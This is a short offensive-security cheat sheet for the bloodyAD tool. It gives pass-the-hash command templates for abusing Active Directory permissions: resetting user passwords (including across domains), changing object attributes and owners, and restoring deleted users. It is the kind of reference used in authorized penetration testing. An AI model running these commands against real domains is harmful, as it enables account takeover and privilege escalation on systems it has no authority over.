# bloodyAD

% windows, Active directory
#plateform/linux #target/remote  #cat/ATTACK/DACL-ABUSE


## set - reset password (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyAD --host <dc_fqdn> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set password <target_user> '<password|Zaebuj12345+->' 
```

## set cross-domain - reset user password (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyAD --host <target_dc_fqdn> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set password <target_user> '<password|Zaebuj12345+->' 
```

## set - object attribute delete  (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyAD --host <dc_fqdn> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set object <target_dn> <attribute>
```

## set - object attribute add/replace  (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyAD --host <dc_fqdn> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set object <target_dn> <attribute> -v <value>
```

## set - object onwer (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyAD --host <dc_fqdn> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set  owner <target> <owner>
```

## set - restore tombstone users (pth)
https://cravaterouge.com/articles/ad-bin/
```bash
bloodyAD --host <dc_fqdn> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set restore '<sid>'
```

